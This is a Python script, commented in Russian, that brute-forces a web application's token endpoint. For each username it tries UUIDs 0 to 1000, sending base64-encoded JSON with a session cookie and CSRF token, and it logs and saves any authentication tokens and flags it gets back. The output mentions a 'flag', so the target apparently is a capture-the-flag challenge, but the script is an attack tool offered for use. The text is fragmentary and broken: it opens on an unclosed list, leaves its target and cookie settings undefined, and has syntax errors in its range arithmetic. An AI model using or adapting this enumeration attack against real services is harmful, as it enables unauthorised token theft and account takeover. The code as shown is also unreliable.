USERNAMES = [

# Диапазон UUID (включительно)
UUID_START = 0
UUID_END = 1000

# Задержка между запросами (0: без задержки)
DELAY = 0.05

# Тип тела запроса: "json" или "form"
BODY_TYPE = "json"

# ===================================================

def get_csrf_token(session):
    """Извлекает CSRF-токен из кук или со страницы."""
    session.get(BASE_URL, timeout=10)
    # Проверяем куки
    for cookie in session.cookies:
        if cookie.name.lower() in ['csrftoken', 'xsrf-token']:
            return cookie.value
    # Пробуем найти в HTML
    resp = session.get(BASE_URL + "/login", timeout=10)
    match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)', resp.text)
    if match:
        return match.group(1)
    return None

def build_request(session, uuid, username, csrf_token):
    """
    Формирует POST-запрос.
    Возвращает (success: bool, data: dict|None, raw_text: str)
    data: весь JSON-объект ответа при успехе, иначе None.
    """
    payload = {"get_token": "True", "uuid": str(uuid), "username": username}
    json_str = json.dumps(payload)
    b64_data = base64.b64encode(json_str.encode()).decode()

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": BASE_URL,
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token  # Django

    url = BASE_URL + TOKEN_PATH

    try:
        if BODY_TYPE == "json":
            headers["Content-Type"] = "application/json"
            resp = session.post(url, json={"data": b64_data}, headers=headers, timeout=10)
        else:
            resp = session.post(url, data={"data": b64_data}, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if "token" in data:
                    # Успех: возвращаем весь словарь
                    return True, data, resp.text.strip()
                else:
                    return False, None, resp.text.strip()
            except:
                return False, None, resp.text.strip()
        else:
            return False, None, f"[{resp.status_code}] {resp.text.strip()[:200]}"
    except Exception as e:
        return False, None, f"NETWORK ERROR: {e}"

def main():
    s = requests.Session()
    s.cookies.update(SESSION_COOKIE)

    # Получаем CSRF
    csrf = get_csrf_token(s)
    if csrf:
        print(f"[*] CSRF-токен получен: {csrf[:30]}...")
    else:
        print("[!] CSRF-токен не найден. Продолжаем без него (возможны 403).")

    # Проверка сессии
    test = s.get(BASE_URL + "/", timeout=10)
    if test.status_code >= 400:
        print(f"[!] Сессия невалидна (код {test.status_code}). Обнови куку и перезапусти.")
        sys.exit(1)

    total_requests = len(USERNAMES) * (UUID_END: UUID_START + 1)
    print(f"[*] Всего пользователей: {len(USERNAMES)}")
    print(f"[*] Диапазон UUID: {UUID_START}-{UUID_END} (всего {UUID_END-UUID_START+1} на пользователя)")
    print(f"[*] Всего запросов: {total_requests}")
    print(f"[*] Задержка: {DELAY} сек\n")

    logfile = open("brute_fulllog.log", "a", encoding="utf-8")
    logfile.write(f"\n=== СТАРТ {datetime.now()} ===\n")

    found_tokens = []
    overall_progress = tqdm(total=total_requests, desc="Общий прогресс", unit="req", position=0)

    for idx, username in enumerate(USERNAMES, 1):
        user_desc = f"[User {idx}/{len(USERNAMES)}] {username:15}"
        user_pbar = tqdm(total=UUID_END: UUID_START + 1,
                         desc=user_desc,
                         unit="uuid",
                         position=1,
                         leave=False)
        for uid in range(UUID_START, UUID_END + 1):
            success, data, raw_text = build_request(s, uid, username, csrf)

            # Логируем
            logfile.write(f"{datetime.now()} | USER={username} UUID={uid} | {raw_text}\n")
            logfile.flush()

            if success:
                tqdm.write(f"\n[+] НАЙДЕН ТОКЕН! USER={username} UUID={uid}")
                tqdm.write(f"    ПОЛНЫЙ ОТВЕТ:\n{json.dumps(data, indent=2)}")
                found_tokens.append((username, uid, data))
                # Добиваем прогресс-бар текущего пользователя и выходим из цикла по UUID
                user_pbar.update(UUID_END: uid + 1)
                break

            user_pbar.update(1)
            overall_progress.update(1)

            if DELAY:
                time.sleep(DELAY)

        user_pbar.close()

    overall_progress.close()
    logfile.close()

    print("\n=== РЕЗУЛЬТАТЫ ===")
    if found_tokens:
        for user, uid, resp_dict in found_tokens:
            print(f"  Пользователь: {user} (UUID: {uid})")
            print(f"  Флаг: {resp_dict.get('flag', 'НЕТ')}")
            print(f"  Токен: {resp_dict.get('token', 'НЕТ')}")
            print("---")
        with open("found_tokens.txt", "w") as f:
            for user, uid, resp_dict in found_tokens:
                f.write(f"USER={user}\nUUID={uid}\n")
                for k, v in resp_dict.items():
                    f.write(f"{k}: {v}\n")
                f.write("\n")
    else:
        print("[-] Токены не найдены. Увеличьте диапазон UUID или измените список пользователей.")

if __name__ == "__main__":
    main()
